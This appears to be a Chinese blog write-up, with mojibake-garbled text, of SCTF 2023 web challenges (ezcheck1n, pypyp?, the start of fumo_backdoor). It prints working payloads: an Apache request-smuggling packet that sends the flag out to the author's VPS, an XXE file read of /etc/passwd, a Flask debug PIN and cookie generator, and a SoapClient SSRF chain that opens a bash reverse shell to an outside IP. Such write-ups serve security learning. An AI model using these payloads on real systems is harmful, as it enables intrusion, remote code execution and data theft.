[{"title":"SCTF-Webå¤ç°","url":"/2023/06/25/SCTF-Webå¤ç°/","content":"\n# SCTF-Webå¤ç°\n\n## ezcheck1n\n\né¢˜ç›®ä»£ç é€»è¾‘å¦‚ä¸‹ï¼Œä¸»è¦é€»è¾‘æ˜¯ä»å‚æ•°ä¸­è·å–urlå‚æ•°ï¼Œç„¶åæŠŠflagå˜é‡æ‹¼æ¥åˆ°urlåé¢ï¼Œä¹‹åå‘è¿‡å»ï¼Œå…¶å®å°±æ˜¯ä¸ªå¤–å¸¦å›æ˜¾\n\n```php\n<?php\n\n$FLAG = \"flag{fake_flag}\";\n@file_get_contents(\"http://\".$_GET['url'].$FLAG);\n# but it's not the real flag\n# beacuse someone say this year is not 2023 !!! like the post?\nshow_source('./2023.php');\n$a = file_get_contents('./post.jpeg');\necho '<img src=\"data:image/jpeg;base64,' . base64_encode($a) . '\">';\n# notice -> time\n# How should you get to where the flag is, the middleware will not forward requests that are not 2023\n?>\n```\n\nå°è¯•ä¸€ä¸‹ï¼š\n\n![image-20230624144319581](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144319581.png)\n\n```tex\nroot@VM-24-4-ubuntu:~# nc -lvnp 7777\nListening on 0.0.0.0 7777\nConnection received on 115.239.215.75 54096\nGET /flag{fake_flag} HTTP/1.0\nHost: 43.143.246.73:7777\nConnection: close\n```\n\nè¿™é‡Œæœ‰ä¸¤ä¸ªåœ°æ–¹å¾ˆå¥‡æ€ªï¼Œä¸€ä¸ªæ˜¯ä¼ å‚çš„æ—¶å€™ï¼Œç”¨`?url=xxxx:xxxx/`è¿™ç§å½¢å¼ä¼ é€’æ˜¯ä¸è¡Œçš„ï¼Œè¿˜æœ‰å°±æ˜¯æˆ‘å¹¶æ²¡æœ‰åœ¨2023.phpä¸‹è¿›è¡Œå‚æ•°ä¼ é€’ä¹Ÿå¯ä»¥é€šï¼Œå…¶å®è¿™ä¸¤ä¸ªé—®é¢˜éƒ½æ˜¯ä¸€ä¸ªåŸå› ï¼Œå°±æ˜¯apacheçš„Rewriteè§„åˆ™ï¼Œç›¸ä¿¡å¦‚æœäº†è§£è¿‡apache-Rewriteçš„å¸ˆå‚…è‚¯å®šä¸é™Œç”Ÿï¼Œå®ƒé‡‡ç”¨çš„æ˜¯æ­£åˆ™åŒ¹é…çš„æ–¹å¼ï¼Œéšä¾¿ä¸€çŒœä¹Ÿå¯ä»¥çŒœçš„å‡ºæ¥åŒ¹é…çš„æ˜¯/2023/ï¼ˆæ­£åˆ™å†…å®¹ï¼‰ï¼Œç„¶åå°†æ­£åˆ™å†…å®¹ä½œä¸ºå‚æ•°è½¬äº¤ç»™å…¶ä»–é€»è¾‘ï¼ˆ2023.phpï¼‰å¤„ç†ã€‚æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç†è§£æˆåœ¨urlå‰é¢å·²ç»æœ‰ä¸€ä¸ªé»˜è®¤çš„å‚æ•°äº†ï¼Œå°±ä¸èƒ½ç”¨?è¿›è¡Œä¼ å‚ï¼Œè€Œæ˜¯ç”¨&æ‹¼æ¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ‰€ä»¥å…¶å®è¿™æ ·ä¼ ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆè¿™é‡Œæˆ‘å¯èƒ½ç†è§£çš„ä¸å¤Ÿæ·±ï¼Œå¦‚æœæœ‰å¸ˆå‚…æœ‰å…¶ä»–ç†è§£ä¹Ÿå—éº»çƒ¦æŒ‡æ­£ä¸€ä¸‹ï¼‰ï¼š\n![image-20230624144805079](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144805079.png)\n\nç„¶åf12åœ¨ç›¸åº”headerä¸­å¯ä»¥çœ‹åˆ°apacheçš„ç‰ˆæœ¬æ˜¯2.5.4ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„apcheå­˜åœ¨èµ°ç§æ¼æ´ï¼Œè¯´ç™½äº†å°±æ˜¯å¯ä»¥åœ¨ä¸€æ¬¡è¯·æ±‚ä¸­å‘é€å¤šä¸ªæ•°æ®åŒ…è¯·æ±‚ï¼Œå‚è€ƒæ–‡ç« å¦‚ä¸‹ï¼šhttps://forum.butian.net/share/2180ï¼š\n![image-20230624145004531](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624145004531.png)\n\nç„¶åå°±åˆ°äº†è¿™é“é¢˜æœ€æŠ½è±¡çš„åœ°æ–¹ï¼Œå°±æ˜¯å¯¹å‡ºé¢˜äººçš„è„‘æ´ï¼Œè¿™äº›æç¤ºå…¶å®å°±æ˜¯å‘Šè¯‰æˆ‘ä»¬ä¸­é—´ä»¶èƒ½è§£æçš„è¯·æ±‚æ˜¯2023çš„ï¼Œä½†æ˜¯çœŸæ­£çš„flagå´ä¸åœ¨2023ä¸­ï¼Œè°œè¯­ç¿»è¯‘è¿‡æ¥å°±æ˜¯è¦ç”¨èµ°ç§æ„é€ ä¸€ä¸ª2023çš„æ•°æ®åŒ…æ¥ç»•è¿‡ä¸­é—´ä»¶ï¼Œç„¶åå†æ„é€ ä¸€ä¸ªè®¿é—®2022.phpçš„æ•°æ®åŒ…æ‹¿åˆ°flagï¼š\n\n```tex\n# but it's not the real flag\n# beacuse someone say this year is not 2023 !!! like the post?\nshow_source('./2023.php');\n# notice -> time\n# How should you get to where the flag is, the middleware will not forward requests that are not 2023\n```\n\nç„¶åè¿™é‡Œèµ›ååˆå¤ç°äº†ä¸€éï¼Œè²Œä¼¼æ˜¯ç¯å¢ƒå¯„äº†ï¼Œæ‹¿å½“æ—¶æ¯”èµ›æ—¶æ‰“é€šçš„payloadå’Œå„ç§å…¶ä»–å¸ˆå‚…çš„payloadå…¨æ˜¯è¶…æ—¶ï¼Œæ•°æ®åŒ…å¤§æ¦‚å°±è¿™ä¹ˆæ„é€ ï¼š\n\nburpéšä¾¿æŠ“ä¸ªåŒ…å­˜åˆ°pre.txtä¸­ï¼Œç„¶åå†™ä¸ªè„šæœ¬æŠŠé‡Œé¢ç©ºæ ¼æ›¿æ¢æˆ%20ï¼Œæ¢è¡Œæ›¿æ¢æˆ%0d%0aï¼š\n\n```python\nimport os\n\nhttptext = \"\"\nf = open('pre.txt', 'r')\n#### è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå°†æ¯ä¸€è¡Œä¸­çš„ç©ºæ ¼æ›¿æ¢ä¸º%20 ####\nfor line in f.readlines():\n    line = line.replace(' ', '%20')\n    # print(line)\n    #### å°†æ¯ä¸€è¡Œçš„\\næ›¿æ¢ä¸º%0d%0a ####\n    #### å¹¶å­˜å‚¨åˆ°httptextä¸­ ####\n    httptext = httptext + line.replace('\\n', '%0d%0a')\nf.close()\nhttptext = httptext + \"\"\nprint(httptext)\n```\n\nä¹‹åå†æ„é€ å‡ºç¬¬äºŒä¸ªæ•°æ®åŒ…å°±è¡Œäº†ï¼Œç„¶åç¬¬äºŒä¸ªæ•°æ®åŒ…è®¿é—®çš„è·¯ç”±å’Œå‚æ•°æ˜¯`2022.php?url=vpsip:port/`ï¼Œç„¶åä¸¤ä¸ªæ•°æ®åŒ…ä¹‹é—´ç”¨%0d%0a%0d%0aè¿›è¡Œæ‹¼æ¥å°±å¯ä»¥äº†ï¼Œæœ€åæ„é€ å¥½çš„åŒ…æ–‡æ˜¯è¿™æ ·çš„ï¼ˆæ¯”èµ›æ—¶æ‰“é€šçš„ï¼‰ï¼š\n\n```tex\nGET /2023/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3d43.143.246.73%3a7777 HTTP/1.1\nHost: 115.239.215.75:8082\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://115.239.215.75:8082/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n```\n\n![image-20230624153802426](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624153802426.png)\n\n## pypyp?\n\nå…ˆæ¥ç‚¹å°è„‘æ´ï¼Œè¿›å…¥ç¯å¢ƒä¹‹åè¯´æ²¡æœ‰Sessionï¼Œè¿™é‡Œæ˜¯phpçš„Sessionï¼Œå¯èƒ½å¾ˆå¤šäººä¼šè¯¯è§£æˆPythonçš„Sessionï¼Œç„¶åå¯ä»¥åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSåœ¨å®¢æˆ·ç«¯å¼ºè¡Œåˆ›å»ºä¸€ä¸ªSessionï¼Œå¹¶ä¸”`session.upload_progress.name`è¿™ä¸ªå±æ€§ï¼ˆSessionå…¨å±€æ•°ç»„ä¸­çš„keyï¼‰æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡POSTä¸€ä¸ªæ¶æ„çš„PHP_SESSION_UPLOAD_PROGRESSå­—æ®µï¼Œå¹¶ä¸”è¿™ä¸ªå­—æ®µçš„Valueå°±æ˜¯è¿™ä¸ª`session.upload_progress.name`ã€‚\n\n> Session Upload Progress æœ€åˆæ˜¯PHPä¸ºä¸Šä¼ è¿›åº¦æ¡è®¾è®¡çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼ŒPHPå°†è¿›è¡Œæµå¼ä¸Šä¼ ï¼Œå¹¶å°†è¿›åº¦ä¿¡æ¯æ”¾åœ¨Sessionä¸­ï¼Œæ­¤æ—¶å³ä½¿ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚è€Œä¸”ï¼Œé»˜è®¤æƒ…å†µä¸‹session.upload_progress.enabledæ˜¯ä¸ºOnçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç‰¹æ€§é»˜è®¤å¼€å¯ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹æ€§æ¥åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆå§‹åŒ–Sessionã€‚\n\nä»ä¸Šé¢å®˜æ–¹ç»™å‡ºçš„å®šä¹‰ä¸­å¯ä»¥çŸ¥é“PHP_SESSION_UPLOAD_PROGRESSæ˜¯ä¸€ä¸ªç”¨æ¥ç»Ÿè®¡æ–‡ä»¶ä¸Šä¼ è¿›åº¦çš„Sessionï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè¡¨å•ï¼ŒPOSTä¸€ä¸ªPHP_SESSION_UPLOAD_PROGRESSå­—æ®µï¼Œå¹¶åŠ å…¥ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå°±å¯ä»¥è·å–åˆ°ä¼ªé€ çš„è¡¨å•æäº¤åŒ…æ–‡äº†ï¼š\n\n```html\n<!doctype html>\n<html>\n<body>\n<form action=\"http://xxxxx/index.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n</body>\n</html>\n\n```\n\nä¸Šä¼ æ–‡ä»¶å¹¶æŠ“åŒ…å¯ä»¥æ‹¿åˆ°è¿™æ ·çš„åŒ…æ–‡ï¼š\n\n![image-20230624213220127](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213220127.png)\n\næ”¹é€ é¢˜ç›®ç¯å¢ƒçš„åŒ…æ–‡ï¼Œç»•è¿‡ç¬¬ä¸€å…³ï¼š\n\n![image-20230624213300251](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213300251.png)\n\næ‹¿åˆ°é¢˜ç›®æºç å¦‚ä¸‹ï¼š\n\n```php\n<?php\n    error_reporting(0);\n    if(!isset($_SESSION)){\n        die('Session not started');\n    }\n    highlight_file(__FILE__);\n    $type = $_SESSION['type'];\n    $properties = $_SESSION['properties'];\n    echo urlencode($_POST['data']);\n    extract(unserialize($_POST['data']));\n    if(is_string($properties)&&unserialize(urldecode($properties))){\n    $object = unserialize(urldecode($properties));\n    $object -> sctf();\n    exit();\n    } else if(is_array($properties)){\n        $object = new $type($properties[0],$properties[1]);\n    } else {\n        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n    }\n    echo \"this is the object: $object <br>\";\n\n?>\n```\n\nå…ˆçœ‹ç¬¬ä¸€éƒ¨åˆ†ï¼Œæœ‰ä¸ªå˜é‡è¦†ç›–`  extract(unserialize($_POST['data']));`ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ¥è¦†ç›–ä¸Šé¢$typeå’Œ$propertiesçš„å€¼ï¼Œå†å¾€ä¸‹çœ‹å‘ç°æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼š\n\n```php\nif(is_array($properties)){\n        $object = new $type($properties[0],$properties[1]);\n    }\n```\n\nå¦‚æœ$propertiesæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå°±newä¸€ä¸ª$typeå¯¹è±¡ï¼Œå¹¶ä¸”ä¼ å…¥å‚æ•°ä¸º`$properties[0],$properties[1]`ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®©$typeä¸º`SimpleXMLElement`è¿™ä¸ªåŸç”Ÿç±»ï¼Œè¿™ä¸ªåŸç”Ÿç±»å¯ä»¥è§£æä¸€ä¸ªXMLæ–‡æ¡£ï¼Œå¹¶ä¸”åˆå§‹åŒ–æ—¶å‚æ•°å¦‚ä¸‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°`data_is_url`ï¼Œé»˜è®¤ä¸ºfalseï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°dataéœ€è¦ä¼ å…¥ä¸€ä¸ªxmlï¼š\n![image-20230624222702721](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624222702721.png)\n\nè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªpayloadï¼Œä»è€Œå®ç°XXEï¼Œè¿™æ ·æˆ‘ä»¬å°±å®ç°äº†ä»»æ„æ–‡ä»¶è¯»å–ï¼š\n\n```php\n<?php\n$pro = array('<?xml version=\"1.0\" ?><!DOCTYPE ANY[<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><root>&xxe;</root>',2);\n$arr = array(\"properties\"=>$pro,\"type\"=>SimpleXMLElement);\n// print_r($arr);\nprint_r(serialize($arr));\n```\n\n![image-20230624224532021](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624224532021.png)\n\nå†çœ‹elseçš„éƒ¨åˆ†ï¼Œå¦‚æœ$propertiesä¸æ˜¯æ•°ç»„ï¼Œå°±ä¼šè®¿é—®è¿œç¨‹çš„ä¸€ä¸ªæœåŠ¡ï¼Œé¢˜ç›®æç¤ºäº†/app/app.pyï¼Œæˆ‘ä»¬è¿™é‡Œxxeçœ‹ä¸€ä¸‹ä»£ç ï¼š\t\n\n```php\nif(is_array($properties)){\n        $object = new $type($properties[0],$properties[1]);\n    } else {\n        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n    }\n```\n\nå‘ç°FlaskæœåŠ¡å¼€å¯äº†debugï¼Œç®—pinç å°±å¯ä»¥äº†ï¼š\n\n![image-20230624230721367](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624230721367.png)\n\næ”¾ä¸ªç®—pinç çš„è„šæœ¬ï¼Œè¿˜èƒ½é¡ºå¸¦ç®—å‡ºcookieï¼Œæ–¹ä¾¿åé¢ç›´æ¥ç”¨ï¼š\n\né¡¹ç›®åœ°å€ï¼šhttps://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code/blob/main/get_flask_pin_and_cookie.py\n\n```python\n#!/usr/bin/python3\n\n# Tested on Python3.8\n# This script generates a Cookie based on a legitimate PIN code.\n\n# If you are using a Python version lower than 3.8 and you were unable to generate a Cookie or PIN, use the script at the link below.\n# It is based on the following script, which generates only the PIN code:\n# https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get_flask_pin.py\n\n# In different versions of python, the hashing algorithm may differ, in this case, sha1 is used.\n# There may also be other differences.\n\nimport argparse\nimport os\nimport getpass\nimport sys\nimport hashlib\nimport time\nimport uuid\nfrom itertools import chain\n\ntext_type = str\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\ndef get_pin(args):\n    rv = None\n    num = None\n    username = args.username\n    modname = args.modname\n    appname = args.appname\n    fname = args.basefile\n    probably_public_bits = [username, modname, appname, fname]\n    private_bits = [args.uuid, args.machineid]\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, text_type):\n            bit = bit.encode('utf-8')\n        h.update(bit)\n    h.update(b'cookiesalt')\n\n    cookie_name = '__wzd' + h.hexdigest()[:20]\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b'pinsalt')\n        num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                              for x in range(0, len(num), group_size))\n                break\n        else:\n            rv = num\n\n    hash_pin(rv)\n    print(\"Cookie: \", cookie_name + \"=\" + str(int(time.time())) + '|' + hash_pin(rv))\n    return rv\n\n\nif __name__ == \"__main__\":\n    versions = [\"2.7\", \"3.0\", \"3.1\", \"3.2\", \"3.3\", \"3.4\", \"3.5\", \"3.6\", \"3.7\", \"3.8\"]\n    parser = argparse.ArgumentParser(description=\"tool to get the flask debug pin from system information\")\n    parser.add_argument(\"--username\", required=False, default=\"www-data\",\n                        help=\"The username of the user running the web server\")\n    parser.add_argument(\"--modname\", required=False, default=\"flask.app\",\n                        help=\"The module name (app.__module__ or app.__class__.__module__)\")\n    parser.add_argument(\"--appname\", required=False, default=\"Flask\",\n                        help=\"The app name (app.__name__ or app.__class__.__name__)\")\n    parser.add_argument(\"--basefile\", required=False,\n                        help=\"The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))\")\n    parser.add_argument(\"--uuid\", required=True,\n                        help=\"System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)\")\n    parser.add_argument(\"--machineid\", required=True,\n                        help=\"System machine ID (édockerç¯å¢ƒï¼š/etc/machine-id  dockerç¯å¢ƒï¼š /proc/sys/kernel/random/boot_id+/proc/self/cgroup)\")\n\n    args = parser.parse_args()\n    if args.basefile is None:\n        print(\"[!] App.py base path not provided, trying for most versions of python\\n\")\n        for v in versions:\n            args.basefile = f\"/usr/local/lib/python{v}/dist-packages/flask/app.py\"\n            print(f\"PIN Python {v}: {get_pin(args)}\\n\")\n    else:\n        print(\"PIN: \", get_pin(args))\n```\n\nå…¶ä¸­éœ€è¦è·å–çš„å‚æ•°çš„æ–¹æ³•å¦‚ä¸‹ï¼š\n\n- usernameï¼šé€šè¿‡æŸ¥çœ‹/etc/passwdå¯ä»¥çœ‹åˆ°å…¨éƒ¨çš„ç”¨æˆ·ï¼Œæœ‰ä¸€ä¸ªå«åšappçš„ï¼Œæ˜¯è¿™ä¸ªç”¨æˆ·\n\n- modenameï¼šé»˜è®¤å€¼ä¸ºflask.appï¼Œä¸éœ€è¦æ”¹\n\n- appnameï¼šé»˜è®¤å€¼ä¸ºFlaskï¼Œä¸éœ€è¦æ”¹\n\n- basefileï¼šapp.pyçš„å­˜æ”¾ä½ç½®ï¼Œè¿™é‡Œå¯ä»¥çŒœï¼Œå¤§éƒ¨åˆ†é»˜è®¤éƒ½æ˜¯`/usr/lib/python3.x/site-packages/flask/app.py`ï¼Œè¿™é‡Œpythonç‰ˆæœ¬æ˜¯3.8ï¼ˆçŒœçš„ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡FileSystemIteratorè¿™ä¸ªåŸç”Ÿç±»æ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ç‰ˆæœ¬ï¼š\n\n  ![image-20230625191325115](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191325115.png)\n\n- uuidï¼šä¸€èˆ¬è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼š`/sys/class/net/eth0/address`çš„åè¿›åˆ¶\n\n- machineidï¼šé¢˜ç›®æ˜¯dockerç¯å¢ƒï¼Œæ‰€ä»¥æ˜¯`/proc/sys/kernel/random/boot_id`åæ‹¼æ¥`/proc/sys/kernel/random/boot_id+/proc/self/cgroup`çš„dockeréƒ¨åˆ†\n\nç®—å‡ºpinç å’Œcookieä¸ºï¼š\n\n![image-20230625191641000](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191641000.png)\n\nç„¶åå°±å¯ä»¥è¿›å…¥consoleä¸­æ‰§è¡Œå‘½ä»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥æœ¬åœ°èµ·ä¸€ä¸ªFlaskè¿›å…¥åˆ°è°ƒè¯•æ¨¡å¼ä¸­æ‰§è¡Œå‘½ä»¤çœ‹çœ‹ä¼ å‚æ˜¯ä»€ä¹ˆæ ·çš„ï¼š\n\n![image-20230625191950887](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191950887.png)\n\næŠ“ä¸€ä¸‹è¾“å…¥pinç æ—¶çš„åŒ…ï¼š\n\n![image-20230625192202208](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192202208.png)\n\nå†æŠ“ä¸€ä¸ªconsoleä¸­æ‰§è¡Œå‘½ä»¤æ—¶çš„åŒ…ï¼ˆè¿™é‡Œå°±ä¼šå‘ç°æ‰§è¡Œå‘½ä»¤æ—¶æ˜¯éœ€è¦Cookieçš„ï¼Œè¿™æ—¶å€™ä¹‹å‰ç®—å¥½çš„Cookieå°±æ´¾ä¸Šç”¨åœºäº†ï¼‰ï¼Œç„¶åè¿™é‡Œå‘ç°å‚æ•°æ˜¯éœ€è¦ä¼ å…¥ä¸€ä¸ªsçš„ï¼Œä¹Ÿå°±æ˜¯FlaskæœåŠ¡çš„SecretKeyï¼Œæˆ‘ä»¬å»è®¿é—®é¢˜ç›®ç¯å¢ƒçš„consoleè·¯ç”±å°±å¯ä»¥çœ‹åˆ°ï¼š\n![image-20230625192245257](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192245257.png)\n\n![image-20230625192559845](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192559845.png)\n\nç„¶åå°±å¯ä»¥æ„é€ RCEçš„æ•°æ®åŒ…äº†ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰RCEæ‰€éœ€çš„å‚æ•°ï¼Œç„¶åè€ƒè™‘æ˜¯å¦å¯ä»¥é€šè¿‡è¿™é‡Œä¼ å‚ä»è€ŒRCEï¼Œç­”æ¡ˆæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºCookieæ²¡åŠæ³•ä¼ è¿‡å»ï¼š\n\n```php\n $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n```\n\næ‰€ä»¥æˆ‘ä»¬åˆè¦é€šè¿‡ä¸€ä¸ªåŸç”Ÿç±»æ¥æ„é€ SSRFï¼Œä»è€Œè®¿é—®5000ç«¯å£çš„è¿™ä¸ªFlaskæœåŠ¡äº†ï¼Œç”¨åˆ°çš„æ˜¯SoapClientè¿™ä¸ªåŸç”Ÿç±»ï¼Œå¯ä»¥ç†è§£æˆç›´æ¥å¯¹targetå‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼š\n\n> ```php\n> SoapClient {\n>     /* æ–¹æ³• */\n>     public __construct ( string|null $wsdl , array $options = [] )\n>     public __call ( string $name , array $args ) : mixed\n> ```\n>\n> å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª `__call` æ–¹æ³•ï¼Œå½“ `__call` æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª `__call` æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚\n>\n> è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š\n>\n> ```php\n> public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])\n> ```\n>\n> - ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚\n> - ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚\n\nçœ‹åˆ°è¿™æ®µä»£ç ï¼š\n\n```php\nif(is_string($properties)&&unserialize(urldecode($properties))){\n$object = unserialize(urldecode($properties));\n$object -> sctf();\n```\n\nå¯ä»¥çœ‹åˆ°$objectè°ƒç”¨äº†sctf()è¿™ä¸ªæ–¹æ³•ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨_callç„¶åæ‰“SSRF\n\næ„é€ å‡ºå¦‚ä¸‹payloadï¼š\n\n```php\n<?php\n$sop = new SoapClient(null,array('user_agent'=>\"test\\r\\nCookie: __wzdb2a60e2b19822632a67c=1687701860|11b8517fb9fb\",'location'=>'http://127.0.0.1:5000/console?__debugger__=yes&cmd=__import__(\"os\").popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20/dev/tcp/43.143.246.73/7777%200%3E%261%5C%22%22)&frm=0&s=DhOJxtvMXCtezvKtqaK9','uri'=>'test'));\n$arr = array(\"properties\"=>urlencode(serialize($sop)));\n$b = serialize($arr);\necho $b;\n```\n\næ‹¿åˆ°shellåç›´æ¥suidææƒå°±å¯ä»¥è¯»å–flag\n\n![image-20230625221633078](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221633078.png)\n\n![image-20230625221745358](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221745358.png)\n\n## fumo_backdoor\n\né¢˜ç›®æºç ï¼š\n\n```php\n<?php\nerror_reporting(0);\nini_set('open_basedir', __DIR__.\":/tmp\");\ndefine(\"FUNC_LIST\", get_defined_functions());\n\nclass fumo_backdoor {\n    public $path = null;\n    public $argv = null;\n    public $func = null;\n    public $class = null;\n    \n    public function __sleep() {\n        if (\n            file_exists($this->path) && \n            preg_match_all('/[flag]/m', $this->path) === 0\n        ) {\n            readfile($this->path);\n        }\n    }\n\n    public function __wakeup() {\n        $func = $this->func;\n        if (\n            is_string($func) && \n            in_array($func, FUNC_LIST[\"internal\"])\n        ) {\n            call_user_func($func);\n        } else {\n            $argv = $this->argv;\n            $class = $this->class;\n            \n            new $class($argv);\n        }\n    }\n}\n\n$cmd = $_REQUEST['cmd'];\n$data = $_REQUEST['data'];\n\nswitch ($cmd) {\n    case 'unserialze':\n        unserialize($data);\n        break;\n    \n    case 'rm':\n        system(\"rm -rf /tmp 2>/dev/null\");\n        break;\n    \n    default:\n        highlight_file(__FILE__);\n        break;\n}\n```\n\n### æ•´ä½“æ€è·¯\n\nè¿™é“é¢˜åˆ©ç”¨çš„æ˜¯`PHPimagick`æ‹“å±•çš„ç‰¹æ€§ï¼Œè¯¥æ‹“å±•å¯ä»¥å®ç°å¯¹å„ç§æ ¼å¼å›¾ç‰‡çš„å„ç§æ“ä½œï¼Œå¹¶ä¸”imagicç±»åœ¨å®ä¾‹åŒ–æ—¶å¯ä»¥æ‰§è¡Œ`Magick Scripting Language`ï¼Œå…¶å½¢å¼å°±æ˜¯ä¸€æ®µxmlï¼Œå¦‚ä¸‹ä¸€æ®µMSLï¼ˆMagick Scripting 